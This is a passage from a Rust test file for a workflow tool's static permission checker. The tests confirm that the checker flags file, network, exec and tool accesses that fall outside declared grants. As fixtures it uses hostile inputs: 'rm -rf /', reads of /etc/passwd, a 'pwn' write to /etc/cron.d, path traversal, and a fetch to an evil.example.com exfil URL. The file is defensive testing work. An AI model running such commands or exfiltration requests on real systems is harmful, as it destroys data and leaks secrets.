// SPDX-License-Identifier: AGPL-3.0-or-later
// Copyright (C) 2024-2026 SuperNovae Studio <contact@supernovae.studio>

//! The permit-fit families under test — a child module of [`super`], so the
//! batteries run under `--lib`. They live in their own file because
//! `permits_fit.rs` plus the four families crosses the 1500-line cap.

use super::*;

#[cfg(test)]
mod fit {
    use super::*;
    use nika_schema::parser::{ParseMode, parse};
    use nika_schema::source::FileId;

    fn escapes_of(yaml: &str) -> Vec<CapabilityEscape> {
        scan_escapes(&parse(yaml, FileId::new(0), ParseMode::Strict).expect("parse"))
    }

    // ── the fs arm of the exec fit (2026-08-20 · the gauntlet's D2) ──

    /// MEASURED 2026-08-20 on nika 0.111.0, both directions, before the
    /// arm existed · `["bash","leg.sh"]` under `exec: [bash]` with no
    /// `fs.read` audited ✔ on all fourteen lanes and printed « risk
    /// supervised », then RAN as `✔ leg`, rc 0 — while the leg had exited
    /// **126** with empty stdout, because the sandbox derives its read set
    /// from `permits.fs.read` and bash could never open the script. Adding
    /// `fs.read: ["leg.sh"]` and changing nothing else returned exit 0 and
    /// the script's output. One grant, byte-identical check verdict.
    ///
    /// The net twin of this arm shipped 2026-07-29 for exactly the same
    /// sentence (`exec: ["curl", …]` outside `permits.net.http` passed
    /// check clean and died at the OS sandbox). The fs half was never
    /// written; this is it.
    #[test]
    fn an_interpreter_script_outside_fs_read_escapes_the_boundary() {
        let escapes = escapes_of(
            "\
nika: t
permits:
  exec: [\"bash\"]
tasks:
  leg:
    exec: { command: [\"bash\", \"leg.sh\"] }
",
        );
        let fs: Vec<_> = escapes.iter().filter(|e| e.category == "fs").collect();
        assert_eq!(fs.len(), 1, "one fs escape expected, got {escapes:?}");
        assert!(
            fs[0].detail.contains("leg.sh") && fs[0].detail.contains("permits.fs.read"),
            "the witness must name the script and the grant: {}",
            fs[0].detail
        );
        assert_eq!(fs[0].task, "leg");
    }

    /// The grant that makes the run work must make the check green — the
    /// asymmetry the whole arm exists to remove.
    #[test]
    fn the_grant_that_makes_the_run_work_makes_the_check_green() {
        let escapes = escapes_of(
            "\
nika: t
permits:
  exec: [\"bash\"]
  fs: { read: [\"leg.sh\"] }
tasks:
  leg:
    exec: { command: [\"bash\", \"leg.sh\"] }
",
        );
        assert!(
            !escapes.iter().any(|e| e.category == "fs"),
            "a granted script must not escape: {escapes:?}"
        );
    }

    /// The silences where a GRANT covers the script. Each row was RUN;
    /// each exits 0. A finding here would be the cancelled kind, since it
    /// would redden a file the run executes.
    #[test]
    fn the_exec_fs_arm_is_silent_where_the_jail_admits_the_script() {
        for yaml in [
            // a globbed subtree
            "\
nika: t
permits:
  exec: [\"bash\"]
  fs: { read: [\"scripts/**\"] }
tasks:
  leg:
    exec: { command: [\"bash\", \"scripts/deploy.sh\"] }
",
            // a BARE directory · the launcher binds it as a subpath
            "\
nika: t
permits:
  exec: [\"bash\"]
  fs: { read: [\"sub\"] }
tasks:
  leg:
    exec: { command: [\"bash\", \"sub/leg.sh\"] }
",
            // a MID-PATH glob · the bound prefix is `sub`, not the pattern
            "\
nika: t
permits:
  exec: [\"bash\"]
  fs: { read: [\"sub/inn*\"] }
tasks:
  leg:
    exec: { command: [\"bash\", \"sub/leg.sh\"] }
",
            // a `cwd:` re-anchors the interpreter's lookup
            "\
nika: t
permits:
  exec: [\"bash\"]
  fs: { read: [\"sub/**\"] }
tasks:
  leg:
    exec: { command: [\"bash\", \"inner.sh\"], cwd: \"sub\" }
",
        ] {
            let escapes = escapes_of(yaml);
            assert!(
                !escapes.iter().any(|e| e.category == "fs"),
                "silence expected for\n{yaml}\ngot {escapes:?}"
            );
        }
    }

    /// The silences where the checker cannot DECIDE. Not one of these is
    /// safe by inspection: each is a question whose answer belongs to the
    /// run, and a claim here would be a guess wearing a code.
    #[test]
    fn the_exec_fs_arm_claims_nothing_it_cannot_decide() {
        for yaml in [
            // not an interpreter · the positional is the program's own business
            "\
nika: t
permits:
  exec: [\"echo\"]
tasks:
  leg:
    exec: { command: [\"echo\", \"hello.txt\"] }
",
            // a templated operand · the run re-judges the resolved argv
            "\
nika: t
inputs:
  which: { type: string }
permits:
  exec: [\"bash\"]
tasks:
  leg:
    exec: { command: [\"bash\", \"${{ inputs.which }}\"] }
",
            // `-m module` · resolved by the interpreter, not opened by name
            "\
nika: t
permits:
  exec: [\"python3\"]
tasks:
  leg:
    exec: { command: [\"python3\", \"-m\", \"unittest\"] }
",
            // a COMPUTED cwd · the script's identity is unknowable
            "\
nika: t
const:
  where: \"sub\"
permits:
  exec: [\"bash\"]
  fs: { read: [\"sub/**\"] }
tasks:
  leg:
    exec: { command: [\"bash\", \"inner.sh\"], cwd: \"${{ const.where }}\" }
",
            // the shell form · judged as an interpolated string at run,
            // never positionally (this lane's standing scope law). MEASURED
            // exit 126 all the same — a named gap, not an assumed one.
            "\
nika: t
permits:
  exec: true
tasks:
  leg:
    exec: { shell: \"bash leg.sh\" }
",
        ] {
            let escapes = escapes_of(yaml);
            assert!(
                !escapes.iter().any(|e| e.category == "fs"),
                "silence expected for\n{yaml}\ngot {escapes:?}"
            );
        }
    }

    /// A boundary that grants SOMETHING but not this — measured 126. The
    /// arm must keep its teeth once it learned to be careful.
    #[test]
    fn a_grant_that_does_not_cover_the_script_still_escapes() {
        let escapes = escapes_of(
            "\
nika: t
permits:
  exec: [\"bash\"]
  fs: { read: [\"data/**\"] }
tasks:
  leg:
    exec: { command: [\"bash\", \"leg.sh\"] }
",
        );
        assert_eq!(
            escapes.iter().filter(|e| e.category == "fs").count(),
            1,
            "a non-covering grant must not buy silence: {escapes:?}"
        );
    }

    /// Mootness, the same law the net arm states: where the FORM is
    /// already refused, the fs question never arises. A task that cannot
    /// spawn at all must not also be told its script is unreadable — it
    /// has one defect, and one repair.
    #[test]
    fn a_refused_exec_form_asks_no_further_fs_question() {
        // zero authority · the category itself escapes
        let escapes = escapes_of(
            "\
nika: t
permits: {}
tasks:
  leg:
    exec: { command: [\"bash\", \"leg.sh\"] }
",
        );
        assert_eq!(
            escapes.iter().filter(|e| e.task == "leg").count(),
            1,
            "one defect, one finding: {escapes:?}"
        );
        assert_eq!(escapes[0].category, "exec");

        // a shell line under a program allowlist · refused by form
        let escapes = escapes_of(
            "\
nika: t
permits:
  exec: [\"bash\"]
tasks:
  leg:
    exec: { shell: \"bash leg.sh\" }
",
        );
        assert!(
            !escapes.iter().any(|e| e.category == "fs"),
            "a refused form asks no fs question: {escapes:?}"
        );
    }

    #[test]
    fn a_globs_walk_root_is_the_read_bound_the_run_needs() {
        // A glob OPENS the directory its pattern roots at. `pattern ⊆
        // permits-glob` is undecidable and stays unjudged — but the WALK ROOT
        // is a literal prefix, the runtime gates it (NIKA-SEC-004), the spec
        // already says the fs read set models it (05-errors · NIKA-DRIFT-001
        // « the fs read set DOES model the two decidable runtime gates ·
        // nika:glob's literal walk root »), and the drift scan already derives
        // it. Only the ONE effect table was missing the entry, so `check`
        // shipped green on a file the run kills. Measured 2026-08-19 on a
        // workflow in the wild: a bound written `<dir>/*.yaml` beside a glob
        // on the same pattern · check GREEN, then run NIKA-SEC-004 on `<dir>`.
        let refused = escapes_of(
            "nika: w\npermits:\n  fs: { read: [\"config/env/*.yaml\"] }\n  tools: [\"nika:glob\"]\ntasks:\n  a:\n    invoke: { tool: \"nika:glob\", args: { pattern: \"config/env/*.yaml\" } }\n",
        );
        assert!(
            !refused.is_empty(),
            "the walk root ./config/env sits outside the declared bound: {refused:?}"
        );

        // The bound that DOES cover the walk root stays silent.
        let covered = escapes_of(
            "nika: w\npermits:\n  fs: { read: [\"config/env/**\"] }\n  tools: [\"nika:glob\"]\ntasks:\n  a:\n    invoke: { tool: \"nika:glob\", args: { pattern: \"config/env/*.yaml\" } }\n",
        );
        assert!(
            covered.is_empty(),
            "a bound covering the walk root must stay silent: {covered:?}"
        );

        // A COMPUTED pattern has no literal walk root · the run owns it, and
        // the checker must not invent a red it cannot prove.
        let templated = escapes_of(
            "nika: w\ninputs: { d: { type: string, default: \"x\" } }\npermits:\n  fs: { read: [\"config/env/**\"] }\n  tools: [\"nika:glob\"]\ntasks:\n  a:\n    invoke: { tool: \"nika:glob\", args: { pattern: \"${{ inputs.d }}/*.yaml\" } }\n",
        );
        assert!(
            templated.is_empty(),
            "a computed pattern is the RUN's verdict, never a static red: {templated:?}"
        );
    }

    #[test]
    fn url_host_matches_the_shared_parity_vectors() {
        // The static extractor (`url_host`) MUST agree with the runtime
        // (`nika-http`'s `host_of`) on every shared vector — the no-drift
        // guarantee. nika-http asserts the SAME table against its extractor;
        // if either drifts on `\@`/userinfo/case/IPv6/trailing-dot, one of
        // the two suites fails. This is the static HALF of the parity the
        // whole `permits.net.http` fix rests on.
        for (input, expected) in nika_types::net::HOST_EXTRACTION_VECTORS {
            assert_eq!(
                url_host(input).as_deref(),
                *expected,
                "url_host disagrees on {input}"
            );
        }
    }

    /// The two newest media builtins were INVISIBLE to the effect
    /// classification: a chart/tts write outside the boundary passed the
    /// static scan and failed at runtime, and --infer-permits wrote a
    /// boundary the run then refused (the self-refusing class). Both
    /// sides pin here — the sibling `.vl.json` included.
    #[test]
    fn chart_and_tts_writes_escape_an_empty_boundary() {
        let escapes = escapes_of(
            "\
nika: t
model: mock/echo
permits:
  fs: { write: [\"elsewhere/**\"] }
  tools: [\"nika:chart\", \"nika:tts_generate\"]
tasks:
  c:
    invoke:
      tool: \"nika:chart\"
      args:
        data: [{ x: \"a\", y: 1 }]
        chart: { type: bar, x: x, y: y }
        out: \"out/c.svg\"
        compile_to: vega_lite
  s:
    invoke:
      tool: \"nika:tts_generate\"
      args:
        text: \"hi\"
        output_dir: \"audio\"
",
        );
        let fs: Vec<&str> = escapes
            .iter()
            .filter(|e| e.category == "fs")
            .map(|e| e.detail.as_str())
            .collect();
        assert!(
            fs.iter().any(|d| d.contains("out/c.svg")),
            "chart artifact write must escape: {fs:?}"
        );
        assert!(
            fs.iter().any(|d| d.contains("out/c.vl.json")),
            "chart vega sibling write must escape: {fs:?}"
        );
        assert!(
            fs.iter().any(|d| d.contains("audio")),
            "tts output_dir write must escape: {fs:?}"
        );
    }

    #[test]
    fn chart_vl_sibling_derives_only_for_literal_vega_lite() {
        let wf = parse(
            "\
nika: t
model: mock/echo
tasks:
  c:
    invoke:
      tool: \"nika:chart\"
      args:
        data: [{ x: \"a\", y: 1 }]
        chart: { type: bar, x: x, y: y }
        out: \"out/c.svg\"
        compile_to: vega_lite
  plain:
    invoke:
      tool: \"nika:chart\"
      args:
        data: [{ x: \"a\", y: 1 }]
        chart: { type: bar, x: x, y: y }
        out: \"out/p.svg\"
",
            FileId::new(0),
            ParseMode::Strict,
        )
        .expect("parse");
        let invoke_of = |id: &str| match &wf
            .tasks
            .iter()
            .find(|t| t.value.id.value == id)
            .expect("task")
            .value
            .action
        {
            nika_schema::raw::RawAction::Invoke(a) => a,
            other => panic!("not an invoke: {other:?}"),
        };
        assert_eq!(
            chart_vl_sibling(invoke_of("c")).as_deref(),
            Some("out/c.vl.json"),
        );
        assert_eq!(chart_vl_sibling(invoke_of("plain")), None);
    }

    #[test]
    fn a_pure_internal_tool_naming_a_path_still_escapes_the_zero_boundary() {
        // The exemption is a property of the CALL, not the tool. `nika:decide`
        // is pure-internal in the SSOT AND carries an fs effect when `bundle:`
        // is a literal path — asking only the class returned before the effect
        // was consulted, so this read rode the legal zero while the identical
        // read through `nika:read` was refused. The SSOT already said which was
        // right: « a bundle: path reads like any declared fs.read ».
        let literal = "nika: w\nmodel: mock/echo\ntasks:\n  d:\n    \
             invoke: { tool: \"nika:decide\", args: { bundle: \"/etc/passwd\", evidence: {} } }\n";
        let e = escapes_of(literal);
        assert_eq!(e.len(), 1, "the literal bundle path must escape: {e:?}");
        assert!(e[0].undeclared, "absent block = the AUTH-006 class");

        // The legitimate half survives: an inline object bundle touches no
        // filesystem, so it stays pure compute under the legal zero.
        let inline = "nika: w\nmodel: mock/echo\ntasks:\n  d:\n    \
             invoke: { tool: \"nika:decide\", args: { bundle: { policy: {} }, evidence: {} } }\n";
        assert!(
            escapes_of(inline).is_empty(),
            "an inline bundle needs no authority: {:?}",
            escapes_of(inline)
        );

        // …and the witness that made the asymmetry visible in the first place.
        let read = "nika: w\nmodel: mock/echo\ntasks:\n  r:\n    \
             invoke: { tool: \"nika:read\", args: { path: \"/etc/passwd\" } }\n";
        assert_eq!(escapes_of(read).len(), 1, "the twin read is refused");
    }

    #[test]
    fn absent_permits_every_effect_escapes_the_zero_boundary() {
        // F-O8 « absent = zero authority » + NEP-0003 law 3: no `permits:`
        // block = the EMPTY boundary — a STATICALLY visible exec (argv
        // literal) escapes, stamped `undeclared` (the wire code maps to
        // NIKA-AUTH-006), with the grant fix that creates the block.
        let y = "nika: w\ntasks:\n  t:\n    exec: { command: [\"rm\", \"-rf\", \"/\"] }\n";
        let e = escapes_of(y);
        assert_eq!(
            e.len(),
            1,
            "the static exec escapes the zero boundary: {e:?}"
        );
        assert!(e[0].undeclared, "absent block = the AUTH-006 class");
        assert!(!e[0].floor, "not the SSRF floor class");
        // Law 1 binds EVERY exec form: a shell string carries the same
        // Required {exec} — its CONTENT is unknowable at check, but the
        // AUTHORITY question is decidable (∅ grants nothing, the run is
        // refused before spawn whatever the line turns out to be), so the
        // check refuses with the same AUTH-006 class. Law 3's runtime
        // deferral owns the dynamic VALUE cases, never the category.
        // (The 2026-08-04 P0 probe: this exact spelling passed GREEN while
        // the argv twin was refused — the gate blocked the verifiable door
        // and opened the unverifiable one.)
        let shell = "nika: w\ntasks:\n  t:\n    exec: { shell: \"rm -rf /\" }\n";
        let e = escapes_of(shell);
        assert_eq!(
            e.len(),
            1,
            "shell form under absent = the same zero-authority refusal (NEP-0003 law 1): {e:?}"
        );
        assert!(e[0].undeclared, "absent block = the AUTH-006 class");
        assert_eq!(
            e[0].fix, None,
            "no program allowlist verifies a shell string — no machine fix"
        );
        // Persona 7 · 2026-08-22: AUTH-006 on `/etc/passwd` taught
        // « and the path to permits.fs »; applying `--infer-permits`
        // greened the read. The tool conjunct stays; the path never
        // becomes a printed grant.
        let host = "nika: w\ntasks:\n  steal:\n    invoke: { tool: \"nika:read\", args: { path: \"/etc/passwd\" } }\n";
        let e = escapes_of(host);
        assert!(
            e.iter().any(|x| x.undeclared && x.category == "fs"),
            "absent block still refuses the host-file read: {e:?}"
        );
        assert!(
            e.iter().all(|x| {
                x.fix.as_deref().is_none_or(|f| {
                    !f.contains("/etc/passwd") && !f.contains("the path to permits.fs")
                })
            }),
            "no printed repair names the host path: {e:?}"
        );
        assert!(
            e.iter()
                .any(|x| x.fix.as_deref() == Some(r#"add "nika:read" to permits.tools"#)),
            "the tool conjunct is still the repair: {e:?}"
        );
        // …and a COMPUTED argv head is the same cell: WHICH program runs
        // is dynamic (law 3's runtime re-gate owns the value), but the
        // category refusal is decidable at check.
        let computed = "nika: w\nconst: { bin: \"git\" }\ntasks:\n  t:\n    exec: { command: [\"${{ const.bin }}\", \"status\"] }\n";
        let e = escapes_of(computed);
        assert_eq!(
            e.len(),
            1,
            "computed argv under absent = the category refusal: {e:?}"
        );
        assert!(e[0].undeclared, "absent block = the AUTH-006 class");
        // …while a PURE-COMPUTE body (no effects) escapes nothing —
        // the legal zero, and the « declare permits: {} » hint owns it.
        let pure = "nika: w\nmodel: mock/echo\ntasks:\n  t:\n    infer: { prompt: \"hi\", max_tokens: 5 }\n";
        assert!(
            escapes_of(pure).is_empty(),
            "pure compute stays clean under the zero boundary"
        );
    }

    #[test]
    fn exec_under_false_permit_escapes() {
        let y =
            "nika: w\npermits: { exec: false }\ntasks:\n  t:\n    exec: { shell: \"echo hi\" }\n";
        let e = escapes_of(y);
        assert_eq!(e.len(), 1);
        assert_eq!(e[0].category, "exec");
    }

    #[test]
    fn exec_outside_program_allowlist_escapes() {
        // Argv form — the ONLY form an allowlist verifies (a shell string
        // under an allowlist escapes by FORM · see the by-form tests).
        let y = "nika: w\npermits: { exec: [\"git\", \"cargo\"] }\ntasks:\n  ok:\n    exec: { command: [\"git\", \"status\"] }\n  bad:\n    exec: { command: [\"rm\", \"-rf\", \"x\"] }\n";
        let e = escapes_of(y);
        assert_eq!(e.len(), 1, "git allowed, rm escapes");
        assert_eq!(e[0].task, "bad");
        assert!(e[0].detail.contains("rm"));
    }

    #[test]
    fn dynamic_argv_head_is_a_runtime_concern_not_a_static_escape() {
        // `["${{ inputs.bin }}", "x"]` — the program is template-built. The
        // static check must NOT compare the raw `${{ }}` island against the
        // allowlist (that was a false positive); runtime NIKA-SEC-004 owns it.
        let y = "nika: w\nconst: { bin: \"git\" }\npermits: { exec: [\"git\"] }\ntasks:\n  t:\n    exec: { command: [\"${{ const.bin }}\", \"status\"] }\n";
        assert!(
            escapes_of(y).is_empty(),
            "dynamic argv[0] is not statically checkable"
        );
    }

    #[test]
    fn escape_fixes_are_machine_applicable() {
        // a REAL tool outside the grant → the fix is the grant line;
        // a PHANTOM builtin (typo) → fix withheld (the rename owns it).
        let y = "nika: w\npermits: { tools: [\"nika:read\"], exec: false }\ntasks:\n  real:\n    invoke: { tool: \"nika:write\", args: { path: \"x\", content: \"y\" } }\n  typo:\n    invoke: { tool: \"nika:wrte\", args: { path: \"x\", content: \"y\" } }\n";
        let e = escapes_of(y);
        assert_eq!(e.len(), 2);
        assert_eq!(
            e[0].fix.as_deref(),
            Some("add \"nika:write\" to permits.tools")
        );
        assert_eq!(e[1].fix, None, "phantom builtin → rename owns the repair");
    }

    /// THE LAW (A-1d · user gauntlet 2026-07-31 · G-09 · Nina): the
    /// checker never hands the shovel with the hole. A path that
    /// ESCAPES the workspace earns NO machine fix (the agent repair
    /// loop must never auto-widen a boundary toward an escape) and the
    /// detail teaches the narrow way first — the declared entries by
    /// name — with the widening named as the deliberate second. An
    /// in-tree path keeps the classic grant fix, byte-identical.
    #[test]
    fn escaping_path_earns_no_shovel_in_tree_path_keeps_the_grant_fix() {
        let y = "nika: w\npermits: { tools: [\"nika:write\"], fs: { write: [\"report.md\"] } }\ntasks:\n  probe:\n    invoke: { tool: \"nika:write\", args: { path: \"../../pwned.md\", content: \"x\" } }\n  neighbor:\n    invoke: { tool: \"nika:write\", args: { path: \"out/notes.md\", content: \"y\" } }\n";
        let e = escapes_of(y);
        assert_eq!(e.len(), 2, "{e:?}");
        let probe = e
            .iter()
            .find(|c| c.detail.contains("../../pwned.md"))
            .expect("the escape row");
        assert_eq!(
            probe.fix, None,
            "no machine fix toward an escape — the shovel stays in the shed: {probe:?}"
        );
        assert!(probe.detail.contains("escapes the workspace"), "{probe:?}");
        assert!(
            probe
                .detail
                .contains("keep the path inside the declared fs.write (report.md)"),
            "the narrow way is taught first, entries named: {probe:?}"
        );
        assert!(
            probe.detail.contains("deliberate operator choice"),
            "the widening is named as the second, deliberate move: {probe:?}"
        );
        let neighbor = e
            .iter()
            .find(|c| c.detail.contains("out/notes.md"))
            .expect("the in-tree row");
        assert_eq!(
            neighbor.fix.as_deref(),
            Some("add \"out/notes.md\" to permits.fs.write"),
            "an in-tree miss keeps the one machine idiom"
        );
    }

    /// The escape read is lexical and exact: absolute roots and
    /// climbing traversals escape; interior `..` that never leaves the
    /// anchor does not (a false alarm here would strip the grant fix
    /// from an honest path).
    #[test]
    fn workspace_escape_is_lexical_and_exact() {
        for escaping in [
            "/etc/passwd",
            "../x",
            "a/../../x",
            "a/b/../../../x",
            "\\\\x",
        ] {
            assert!(path_escapes_workspace(escaping), "{escaping}");
        }
        for inside in ["a/../b", "./x", "out/notes.md", "a/b/../c", "..a/b", "a..b"] {
            assert!(!path_escapes_workspace(inside), "{inside}");
        }
    }

    #[test]
    fn edit_requires_both_fs_directions() {
        // in-place find/replace reads the bytes, then rewrites the path —
        // a write-only grant leaves the read side escaping.
        let y = "nika: w\npermits: { tools: [\"nika:edit\"], fs: { write: [\"./README.md\"] }, exec: false }\ntasks:\n  t:\n    invoke: { tool: \"nika:edit\", args: { path: \"./README.md\", find: \"a\", replace: \"b\" } }\n";
        let e = escapes_of(y);
        assert_eq!(e.len(), 1);
        assert!(e[0].detail.contains("fs.read"), "detail: {}", e[0].detail);
    }

    #[test]
    fn ipv6_bracket_host_is_extracted_not_mangled() {
        // `https://[::1]:8080/x` — the host is `::1`, not `[` (the first-`:`
        // split bug). Bracket-free in permits, symmetric both sides. Since
        // the declassification (#395), a granted `::1` is the author's
        // explicit act: check is GREEN (and the run reaches the host).
        let granted = "nika: w\npermits: { tools: [\"nika:fetch\"], net: { http: [\"::1\"] }, exec: false }\ntasks:\n  t:\n    invoke: { tool: \"nika:fetch\", args: { url: \"https://[::1]:8080/x\" } }\n";
        assert!(
            escapes_of(granted).is_empty(),
            "the exact `::1` literal declassifies its host"
        );
        // UNGRANTED, the floor holds — and the extraction still reads the
        // bare `::1` in the escape detail (the bug this test pins).
        let ungranted = "nika: w\npermits: { tools: [\"nika:fetch\"], net: { http: [\"api.x.com\"] }, exec: false }\ntasks:\n  t:\n    invoke: { tool: \"nika:fetch\", args: { url: \"https://[::1]:8080/x\" } }\n";
        let e = escapes_of(ungranted);
        assert_eq!(e.len(), 1, "floor escape only — never the grant fix");
        assert!(e[0].floor);
        assert!(e[0].detail.contains("`::1`"), "detail: {}", e[0].detail);
    }

    #[test]
    fn webhook_notify_target_is_checked_as_net() {
        let y = "nika: w\npermits: { tools: [\"nika:notify\"], exec: false }\ntasks:\n  t:\n    invoke: { tool: \"nika:notify\", args: { channel: \"webhook\", target: \"https://hooks.x.com/p\", message: \"hi\" } }\n";
        let e = escapes_of(y);
        assert_eq!(e.len(), 1, "webhook target host needs a net grant");
        assert_eq!(e[0].category, "net");
        // a non-webhook channel rides an engine transport — no host check
        let email = "nika: w\npermits: { tools: [\"nika:notify\"], exec: false }\ntasks:\n  t:\n    invoke: { tool: \"nika:notify\", args: { channel: \"email\", target: \"ops@x.com\", message: \"hi\" } }\n";
        assert!(escapes_of(email).is_empty());
    }

    #[test]
    fn invoke_outside_tools_escapes() {
        let y = "nika: w\npermits: { tools: [\"nika:read\"] }\ntasks:\n  t:\n    invoke: { tool: \"nika:write\", args: { path: \"x\", content: \"y\" } }\n";
        let e = escapes_of(y);
        assert_eq!(e.len(), 1);
        assert_eq!(e[0].category, "tools");
        assert!(e[0].detail.contains("nika:write"));
    }

    #[test]
    fn invoke_inside_tools_glob_is_clean() {
        let y = "nika: w\npermits: { tools: [\"mcp:browser/*\"] }\ntasks:\n  t:\n    invoke: { tool: \"mcp:browser/navigate\", args: { url: \"x\" } }\n";
        assert!(escapes_of(y).is_empty());
    }

    #[test]
    fn agent_tool_outside_permits_escapes() {
        let y = "nika: w\npermits: { tools: [\"nika:fetch\"] }\ntasks:\n  t:\n    agent:\n      prompt: \"go\"\n      tools: [\"nika:fetch\", \"nika:write\"]\n";
        let e = escapes_of(y);
        assert_eq!(e.len(), 1, "fetch allowed, write escapes");
        assert!(e[0].detail.contains("nika:write"));
    }

    #[test]
    fn every_shell_string_under_an_allowlist_escapes_by_form() {
        // Runtime parity: under a Programs allowlist the dispatch refuses
        // the shell-string form WHOLESALE (leading token irrelevant — a
        // pipeline can launch any program). Both tasks escape, the one
        // whose head is allowlisted (`GIT_PAGER=cat git …`) included.
        let y = r#"nika: w
permits: { exec: ["git"] }
tasks:
  head_allowed:
    exec: { shell: "GIT_PAGER=cat git log" }
  head_denied:
    exec: { shell: "FOO=1 rm -rf x" }
"#;
        let e = escapes_of(y);
        assert_eq!(e.len(), 2, "the string FORM escapes, not the head");
        assert!(
            e.iter().all(|esc| esc.detail.contains("array form")),
            "both route to the array form"
        );
    }

    #[test]
    fn dynamic_shell_head_under_allowlist_is_flagged_by_form_first() {
        // Before this rule the dynamic head was waved through as « a
        // runtime concern » — but the runtime refuses the string form
        // under an allowlist before it ever looks at the head.
        let y = "nika: w\npermits: { exec: [\"git\"] }\nconst: { cmd: \"git\" }\ntasks:\n  t:\n    exec: { shell: \"${{ const.cmd }} status\" }\n";
        let e = escapes_of(y);
        assert_eq!(e.len(), 1, "string form under an allowlist escapes");
    }

    #[test]
    fn non_webhook_notify_with_url_target_is_not_a_net_sink() {
        // notify is a net egress ONLY on the `webhook` channel. An `email`
        // channel whose `target` happens to parse as a URL must NOT be
        // classified as a net effect — kills the channel-guard→true mutant
        // (which would flag every notify target as a host escape). The
        // existing webhook-positive case kills the guard→false direction.
        let email = "nika: w\npermits: { tools: [\"nika:notify\"], exec: false }\ntasks:\n  t:\n    invoke: { tool: \"nika:notify\", args: { channel: \"email\", target: \"https://hooks.evil.com/p\", message: \"hi\" } }\n";
        assert!(
            escapes_of(email).is_empty(),
            "a non-webhook channel's URL-shaped target is not a net sink"
        );
    }
}

#[cfg(test)]
mod fs_net_regression {
    use super::*;
    use nika_schema::parser::{ParseMode, parse};
    use nika_schema::source::FileId;

    fn escapes(yaml: &str) -> Vec<CapabilityEscape> {
        scan_escapes(&parse(yaml, FileId::new(0), ParseMode::Strict).expect("parse"))
    }

    #[test]
    fn fetch_to_unlisted_host_escapes() {
        // The spec's own first named example: a nika:fetch to an unlisted host.
        let y = r#"nika: w
permits:
  net: { http: ["api.anthropic.com"] }
  tools: ["nika:fetch"]
tasks:
  t:
    invoke: { tool: "nika:fetch", args: { url: "https://evil.example.com/exfil" } }
"#;
        let e = escapes(y);
        assert_eq!(e.len(), 1, "evil host escapes net.http");
        assert_eq!(e[0].category, "net");
        assert!(e[0].detail.contains("evil.example.com"));
    }

    #[test]
    fn fetch_to_listed_host_is_clean() {
        // F-P5: the listed form is the EXACT host — the `*.` wildcard is
        // refused at check (NIKA-AUTH-010 · the permit_taint lane).
        let y = r#"nika: w
permits:
  net: { http: ["api.anthropic.com"] }
  tools: ["nika:fetch"]
tasks:
  t:
    invoke: { tool: "nika:fetch", args: { url: "https://api.anthropic.com/v1/x" } }
"#;
        assert!(escapes(y).is_empty(), "exact host match is clean");
    }

    #[test]
    fn write_outside_fs_write_escapes() {
        // The spec's other named example: nika:write ./etc/x outside fs.write.
        let y = r#"nika: w
permits:
  fs: { write: ["./out/**"] }
  tools: ["nika:write"]
tasks:
  t:
    invoke: { tool: "nika:write", args: { path: "/etc/cron.d/x", content: "pwn" } }
"#;
        let e = escapes(y);
        assert_eq!(e.len(), 1, "etc path escapes fs.write");
        assert_eq!(e[0].category, "fs");
        assert!(e[0].detail.contains("/etc/cron.d/x"));
    }

    #[test]
    fn write_inside_fs_write_glob_is_clean() {
        let y = r#"nika: w
permits:
  fs: { write: ["./out/**"] }
  tools: ["nika:write"]
tasks:
  t:
    invoke: { tool: "nika:write", args: { path: "./out/report.md", content: "x" } }
"#;
        assert!(escapes(y).is_empty(), "./out/** matches ./out/report.md");
    }

    #[test]
    fn dotdot_traversal_out_of_fs_write_is_flagged() {
        // The static half of the permits-bypass fix: a `..` that climbs out
        // of the boundary must NOT string-match the literal prefix. The path
        // lexically normalizes to `./escape.txt`, which is not under
        // `./out/` → flagged (the runtime canonicalize-then-confine is the
        // other half · catches symlinks + dynamic paths a static pass can't).
        let y = r#"nika: w
permits:
  fs: { write: ["./out/**"] }
  tools: ["nika:write"]
tasks:
  t:
    invoke: { tool: "nika:write", args: { path: "./out/../escape.txt", content: "pwn" } }
"#;
        let e = escapes(y);
        assert_eq!(e.len(), 1, "the `..` traversal escapes fs.write");
        assert_eq!(e[0].category, "fs");
        // …while a `..` that stays INSIDE the boundary is still clean.
        let clean = r#"nika: w
permits:
  fs: { read: ["./out/**"] }
  tools: ["nika:read"]
tasks:
  t:
    invoke: { tool: "nika:read", args: { path: "./out/sub/../keep.txt" } }
"#;
        assert!(
            escapes(clean).is_empty(),
            "a `..` that stays inside the boundary is clean"
        );
    }

    #[test]
    fn read_under_write_only_boundary_escapes() {
        // fs declared but only write — a read is default-denied.
        let y = r#"nika: w
permits:
  fs: { write: ["./out/**"] }
  tools: ["nika:read"]
tasks:
  t:
    invoke: { tool: "nika:read", args: { path: "./out/x" } }
"#;
        let e = escapes(y);
        assert_eq!(e.len(), 1, "read is denied when only write is granted");
        assert_eq!(e[0].category, "fs");
    }

    #[test]
    fn dynamic_url_is_a_runtime_concern() {
        let y = r#"nika: w
const: { host: "api.anthropic.com" }
permits:
  net: { http: ["api.anthropic.com"] }
  tools: ["nika:fetch"]
tasks:
  t:
    invoke: { tool: "nika:fetch", args: { url: "https://${{ const.host }}/x" } }
"#;
        assert!(escapes(y).is_empty(), "interpolated url = runtime check");
    }
}

#[cfg(test)]
mod argv_program_check {
    use super::*;
    use nika_schema::parser::{ParseMode, parse};
    use nika_schema::source::FileId;

    fn escapes(yaml: &str) -> Vec<CapabilityEscape> {
        scan_escapes(&parse(yaml, FileId::new(0), ParseMode::Strict).expect("parse"))
    }

    #[test]
    fn argv_program_is_checked_unambiguously() {
        // argv[0] is the program — no shell-split heuristic needed.
        let allowed = r#"nika: w
permits: { exec: ["git"] }
tasks:
  t:
    exec: { command: ["git", "status"] }
"#;
        assert!(escapes(allowed).is_empty(), "git argv allowed");

        let denied = r#"nika: w
permits: { exec: ["git"] }
tasks:
  t:
    exec: { command: ["rm", "-rf", "x"] }
"#;
        let e = escapes(denied);
        assert_eq!(e.len(), 1);
        assert!(
            e[0].detail.contains("rm"),
            "argv[0] rm flagged: {}",
            e[0].detail
        );
    }

    #[test]
    fn argv_with_interpolated_arg_program_still_literal() {
        // The PROGRAM (argv[0]) is literal even when later args interpolate —
        // the whole point of the argv form (injection-safe).
        let y = r#"nika: w
const: { x: "y" }
permits: { exec: ["git"] }
tasks:
  t:
    exec: { command: ["git", "${{ inputs.x }}"] }
"#;
        assert!(escapes(y).is_empty(), "git allowed; the arg is just data");
    }

    #[test]
    fn shell_string_under_program_allowlist_escapes_by_form() {
        // Runtime parity (dispatch refuses ANY shell string under a
